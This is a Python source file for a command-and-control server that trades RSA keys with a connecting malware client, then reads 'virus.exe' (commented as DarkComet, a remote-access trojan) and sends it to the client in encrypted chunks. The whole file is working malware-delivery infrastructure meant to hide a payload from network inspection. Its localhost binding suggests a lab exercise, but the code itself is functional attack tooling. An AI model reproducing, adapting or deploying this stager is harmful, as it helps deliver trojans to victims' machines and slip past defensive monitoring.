from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import socket
from _thread import *

FILE_CHUNCK_SIZE = 190
HOST = "localhost"
PORT = 5555

class Cryptography:

    def __init__(self):
        self.keyPair = RSA.generate(2048)
        self.publicKeyPEM = self.keyPair.publickey().exportKey()
        self.manager = PKCS1_OAEP.new(self.keyPair)

    def encrypt(self,message):
        return self.manager.encrypt(message.encode("utf-8"))
    
    def decrypt(self,cyphertext):
        return self.manager.decrypt(cyphertext).decode()

    def getPublicKey(self):
        return self.publicKeyPEM

class ClientEncryptor:

    def __init__(self,malwarePublicKeyPEM):
        self.publicKey = RSA.importKey(malwarePublicKeyPEM)
        self.manager   = PKCS1_OAEP.new(self.publicKey)

    def encrypt(self,msg):
        return self.manager.encrypt(msg)

def handleClient(clientSocket,clientAddress,crypto):

    # DEBUG
    print(f"[SERVER]Accepted connection from {clientAddress}")
    
    # SENDING THE C2 SERVER'S PUBLIC KEY
    print("[SERVER] Sending server's public key...")
    clientSocket.send(crypto.getPublicKey())

    # RECEIVING THE MALWARE'S PUBLIC KEY
    malwarePublicKey = clientSocket.recv(1024).decode()
    print(f"[SERVER] Received malware's public key : {malwarePublicKey}")

    encryptToMalware = ClientEncryptor(malwarePublicKey)

    # READING DARKCOMET
    PAYLOAD = open("virus.exe","rb")

    data = PAYLOAD.read(FILE_CHUNCK_SIZE)
    while data:

        # ENCRYPTING RESPONSE WITH THE MALWARE'S PUBLIC KEY
        encryptedMessage = encryptToMalware.encrypt(data)
        
        # SENDING THE RESPONSE
        print(f"[SERVER] Sending encrypted message to malware...")
        clientSocket.send(encryptedMessage)

        data = PAYLOAD.read(FILE_CHUNCK_SIZE)

    PAYLOAD.close()

    # CLOSING CONNECTION SOCKET
    print("[SERVER] Closing connection...")
    clientSocket.close()

def main():
    
    crypto = Cryptography()

    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((HOST,PORT))

    # DEBUG
    print("[SERVER] Waiting for a client...")
    server.listen(10)

    while True:
        clientSocket, clientAddress = server.accept()
        start_new_thread(handleClient,(clientSocket,clientAddress,crypto)) 

if __name__ == "__main__":
    main()